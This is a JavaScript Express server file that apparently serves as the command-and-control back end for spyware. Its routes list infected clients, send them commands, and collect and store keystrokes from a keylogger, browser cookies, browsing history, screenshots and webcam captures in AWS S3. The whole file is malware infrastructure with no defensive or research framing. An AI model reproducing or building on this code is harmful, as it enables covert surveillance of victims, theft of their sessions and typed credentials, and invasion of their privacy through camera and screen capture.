import express from 'express';
import cors from 'cors';
import http from 'http';
import 'dotenv/config';
import {S3Client} from "@aws-sdk/client-s3";

import collectorController from "./controllers/collector_controller.js";
import clientController from "./controllers/client_controller.js";
import {fromNodeProviderChain} from "@aws-sdk/credential-providers";
import {apiReference} from "@scalar/express-api-reference";

export const s3Client = new S3Client({region: process.env.AWS_S3_REGION, credentials: fromNodeProviderChain()});

const app = express();

// Middleware to disable cors
app.use(cors())
// Middleware to parse JSON bodies
app.use(express.json({limit: '200mb'}));
// Docs middleware
app.get('/openapi.yaml', (req, res, next) => {
    res.sendFile('openapi.yaml', {root: './'});
})
app.use(
    '/docs',
    apiReference({
        spec: {
            url: '/openapi.yaml',
        },
    }),
)

// Client routes
app.get('/clients', clientController.index)
app.post(`/clients/send-command`, clientController.sendCommand)

// Collector routes
app.get('/collector/screenshot', collectorController.listScreenshots)
app.get('/collector/camera', collectorController.listCameraCaptures)

app.post('/collector/key-logger', collectorController.saveKeys);
app.post('/collector/cookies', collectorController.saveCookies)
app.post('/collector/history', collectorController.saveHistory)
app.post('/collector/screenshot', collectorController.saveScreenshot)
app.post('/collector/camera', collectorController.saveCameraCapture)

export const http_server = http.createServer(app);
